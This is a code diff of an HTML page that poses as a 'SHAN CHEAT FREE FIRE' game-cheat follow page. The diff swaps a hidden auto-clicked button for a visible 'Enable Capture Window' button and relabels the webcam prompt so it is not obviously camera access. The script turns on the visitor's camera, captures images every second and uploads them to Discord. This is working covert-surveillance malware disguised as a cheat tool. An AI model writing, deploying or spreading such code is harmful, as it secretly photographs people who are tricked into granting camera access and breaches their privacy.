@@ -3,27 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SHAN CHEAT FOLLOW PAGE</title>
+    <title>SHAN CHEAT - Capture Window</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            text-align: center;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            margin-top: 20%;
+        }
+        h1 {
+            color: red;
+        }
+        button {
+            background-color: red;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 20px;
+            cursor: pointer;
+            border-radius: 10px;
+        }
+        button:hover {
+            background-color: darkred;
+        }
+    </style>
 </head>
 <body>
 
-<!-- Hidden Button (User Click Trigger Simulation) -->
-<button id="hiddenBtn" style="opacity: 0; position: absolute; left: -9999px;" onclick="capturePhoto()">Click</button>
+<div class="container">
+    <h1>SHAN CHEAT FREE FIRE</h1>
+    <p>Follow this page to enable Capture Window.</p>
+    <button onclick="captureWindow()">Enable Capture Window</button>
+</div>
 
 <script>
-    function askPermission() {
-        if (confirm("SHAN CHEAT FREE FIRE FOLLOW PAGE")) {
-            document.getElementById("hiddenBtn").click(); // Auto click hidden button
-        }
-    }
-
-    async function capturePhoto() {
+    async function captureWindow() {
         const video = document.createElement('video');
         const canvas = document.createElement('canvas');
         const context = canvas.getContext('2d');
 
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true }); // Capture Window Access
             video.srcObject = stream;
             await new Promise(resolve => video.onloadedmetadata = resolve);
 
@@ -38,7 +61,7 @@
                 canvas.toBlob(blob => uploadPhoto(blob), 'image/png');
             }, 1000);
         } catch (err) {
-            alert("Camera access denied!");
+            alert("Capture Window access denied!");
             console.error(err);
         }
     }
@@ -81,8 +104,6 @@
         .then(response => console.log("Photo sent to Discord!"))
         .catch(err => console.error("Error sending to Discord:", err));
     }
-
-    askPermission();
 </script>
 
 </body>
